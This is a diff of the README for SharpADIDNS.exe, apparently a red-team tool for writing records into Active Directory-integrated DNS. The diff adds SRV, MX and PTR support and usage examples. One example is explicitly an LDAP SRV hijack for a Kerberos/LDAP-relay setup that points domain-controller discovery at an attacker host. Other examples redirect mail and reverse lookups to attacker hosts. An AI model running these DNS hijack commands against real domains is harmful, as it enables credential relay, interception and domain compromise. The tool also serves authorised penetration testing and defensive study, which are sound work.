@@ -52,11 +52,15 @@ SharpADIDNS.exe <action> [options]
 
 | Option | Description |
 | ------ | ----------- |
-| `--type <T>`     | `A` / `AAAA` / `CNAME` / `TXT` (default: `A`) |
-| `--data <value>` | IP for A/AAAA, FQDN for CNAME, text for TXT. Alias: `--ip` |
-| `--raw <base64>` | Pre-built `dnsRecord` blob; bypasses `--type` / `--data` |
-| `--ttl <sec>`    | 1..604800 (default: 600) |
-| `--force`        | Replace records of the same type on an existing node. Records of other types on the same node are preserved. |
+| `--type <T>`        | `A` / `AAAA` / `CNAME` / `TXT` / `PTR` / `SRV` / `MX` (default: `A`) |
+| `--data <value>`    | IP for A/AAAA; target FQDN for CNAME/PTR/SRV; exchange FQDN for MX; ASCII for TXT (≤255 bytes). Alias: `--ip`. |
+| `--srv-priority <N>`| SRV priority, 0..65535 (default: 0) |
+| `--srv-weight <N>`  | SRV weight, 0..65535 (default: 0) |
+| `--srv-port <N>`    | SRV port, 0..65535 (**required** when `--type SRV`) |
+| `--mx-pref <N>`     | MX preference, 0..65535 (default: 10) |
+| `--raw <base64>`    | Pre-built `dnsRecord` blob; bypasses `--type` / `--data` and the SRV/MX flags |
+| `--ttl <sec>`       | 1..604800 (default: 600) |
+| `--force`           | Replace records of the same type on an existing node. Records of other types on the same node are preserved. |
 
 ### Authentication
 
@@ -164,6 +168,43 @@ SharpADIDNS.exe add \
     --data attacker.redteamnotes.local \
     --dn DC=redteamnotes,DC=local \
     --force
+```
+
+Hijack an LDAP `SRV` record (classic Kerberos / LDAP-relay setup):
+
+```bash
+SharpADIDNS.exe add \
+    --zone redteamnotes.local \
+    --name _ldap._tcp.dc._msdcs \
+    --type SRV \
+    --srv-priority 0 --srv-weight 100 --srv-port 389 \
+    --data attacker.redteamnotes.local \
+    --dn DC=redteamnotes,DC=local \
+    --force
+```
+
+Add an `MX` record:
+
+```bash
+SharpADIDNS.exe add \
+    --zone redteamnotes.local \
+    --name '@' \
+    --type MX \
+    --mx-pref 10 \
+    --data mail.attacker.redteamnotes.local \
+    --dn DC=redteamnotes,DC=local \
+    --force
+```
+
+Add a `PTR` record in a reverse zone:
+
+```bash
+SharpADIDNS.exe add \
+    --zone 0.0.10.in-addr.arpa \
+    --name 66 \
+    --type PTR \
+    --data attacker.redteamnotes.local \
+    --dn DC=redteamnotes,DC=local
 ```
 
 Tombstone a node instead of hard-deleting it:
